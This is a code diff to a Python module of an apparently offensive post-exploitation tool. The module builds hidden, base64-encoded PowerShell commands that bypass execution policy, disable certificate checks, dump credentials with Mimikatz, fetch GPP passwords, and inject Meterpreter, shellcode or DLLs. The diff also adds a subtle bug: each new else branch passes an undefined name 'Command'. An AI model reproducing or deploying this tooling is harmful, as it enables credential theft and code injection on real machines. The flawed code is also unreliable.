@@ -1,19 +1,19 @@
-from logger import *
 from base64 import b64encode
 import logging
 import settings
 
-def ps_command(command):
+def ps_command(command, arch):
     logging.info('PS command to be encoded: ' + command)
 
     if settings.args.server == 'https':
         logging.info('Disabling certificate checking for the following PS command: ' + command)
         command = "[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};" + command
 
-    if settings.args.force_ps32:
+    if arch == 32:
         logging.info('Forcing the following command to execute in a 32bit PS process: ' + command)
         command = '%SystemRoot%\\SysWOW64\\WindowsPowershell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
-    else:
+    
+    elif arch == 64:
         command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
     
     logging.info('Full PS command: ' + command)
@@ -29,7 +29,8 @@ class PowerShell:
     def __init__(self, server, localip):
         self.localip = localip
         self.protocol = server
-        self.func_name = settings.args.obfs_func_name
+        self.arch = settings.args.ps_arch
+        self.func_name = settings.obfs_func_name
 
     def mimikatz(self, command='privilege::debug sekurlsa::logonpasswords exit'):
 
@@ -50,7 +51,10 @@ class PowerShell:
                                           addr=self.localip,
                                           katz_command=command)
 
-        return ps_command(command)
+        if self.arch == 'auto':
+            return ps_command(command, 64)
+        else:
+            return ps_command(Command, int(self.arch))
 
     def gpp_passwords(self):
         command = """
@@ -69,7 +73,10 @@ class PowerShell:
                                           port=settings.args.server_port,
                                           addr=self.localip)
 
-        return ps_command(command)
+        if self.arch == 'auto':
+            return ps_command(command, 64)
+        else:
+            return ps_command(Command, int(self.arch))
 
     def powerview(self, command):
 
@@ -89,7 +96,10 @@ class PowerShell:
                                           addr=self.localip,
                                           view_command=command)
 
-        return ps_command(command)
+        if self.arch == 'auto':
+            return ps_command(command, 64)
+        else:
+            return ps_command(Command, int(self.arch))
 
     def inject_meterpreter(self):
         #PowerSploit's 3.0 update removed the Meterpreter injection options in Invoke-Shellcode
@@ -120,7 +130,10 @@ class PowerShell:
         if settings.args.procid:
             command += " -ProcessID {}".format(settings.args.procid)
 
-        return ps_command(command)
+        if self.arch == 'auto':
+            return ps_command(command, 32)
+        else:
+            return ps_command(Command, int(self.arch))
 
     def inject_shellcode(self):
         command = """
@@ -138,7 +151,10 @@ class PowerShell:
 
         command += ';'
 
-        return ps_command(command)
+        if self.arch == 'auto':
+            return ps_command(command, 32)
+        else:
+            return ps_command(Command, int(self.arch))
 
     def inject_exe_dll(self):
         command = """
@@ -159,4 +175,7 @@ class PowerShell:
 
         command += ';'
 
-        return ps_command(command)
+        if self.arch == 'auto':
+            return ps_command(command, 32)
+        else:
+            return ps_command(Command, int(self.arch))
